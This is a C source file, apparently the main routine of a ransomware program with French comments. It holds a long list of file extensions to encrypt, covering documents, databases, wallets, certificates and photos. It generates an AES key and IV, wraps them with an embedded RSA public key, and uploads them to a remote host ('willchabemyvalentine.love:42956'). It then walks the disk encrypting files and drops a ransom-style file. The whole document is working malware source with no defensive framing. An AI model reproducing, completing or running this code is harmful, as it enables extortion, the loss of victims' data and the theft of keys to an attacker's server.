#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <wchar.h>
#else
#include <unistd.h>
#endif

#include "files.h"
#include "encryption.h"

#define DEBUG 0


// Liste des extensions à chiffrer
const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", 
                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", 
                            ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                            ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                            ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                            ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", 
                            ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                            ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                            ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
                            ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", 
                            ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", 
                            ".wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", 
                            ".rb", ".png", ".jpeg", ".jpg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", 
                            ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", 
                            ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", 
                            ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".cdr", ".indd", ".ai", 
                            ".eps", ".pdf", ".pdd", ".psd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", 
                            ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", 
                            ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"};

const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);

int main() {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    struct public_key_class pub_key = { NULL };
    struct private_key_class priv_key = { NULL };

    static const unsigned char aad[] = "Cyan";

    char *key_lisible;
    char *iv_lisible;

    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";

    load_public_key(public_key_pem, &pub_key);
    // load_private_key("private_key.pem", &priv_key);

    // Generate AES key and IV
    unsigned char key[32];
    size_t key_size = sizeof(key);
    RAND_bytes(key, key_size);

    unsigned char iv[16];
    size_t iv_size = sizeof(iv);
    RAND_bytes(iv, iv_size);

    key_lisible = debug_bytes(key, key_size);
    iv_lisible = debug_bytes(iv, iv_size);

    if(debug){
        printf("\nAES non chiffré: %s",key_lisible);
        printf("\nIV non chiffré: %s",iv_lisible);
    }

    char *encrypted_key = rsa_encrypt(key_lisible, &pub_key);
    if(debug){
        printf("\n\nAES chiffré : %s\n", encrypted_key);
    }
    
    char *encrypted_iv = rsa_encrypt(iv_lisible, &pub_key);
    if(debug){
        printf("\n\nIV chiffré : %s\n", encrypted_iv);
    }

    write_to_file("aes_key.txt", encrypted_key, 1024);
    write_to_file("iv.txt", encrypted_iv, 1024);

    char ip[] = "willchabemyvalentine.love";
    int port = 42956;
    const char *URL[100];
    sprintf(URL, "http://%s:%d/upload", ip, port);

    char short_aes[11];
    strncpy(short_aes, encrypted_key, 10);
    short_aes[10] = '\0';

    char *ID = short_aes;
    
    create_prank_file(encrypted_key);

    sendFileToApi("aes_key.txt", ID, URL);
    sendFileToApi("iv.txt", ID, URL);
    browse_files(key, iv, aad, ID, URL);

    free(encrypted_iv); 

    free_public_key(&pub_key);

    return 0;

}



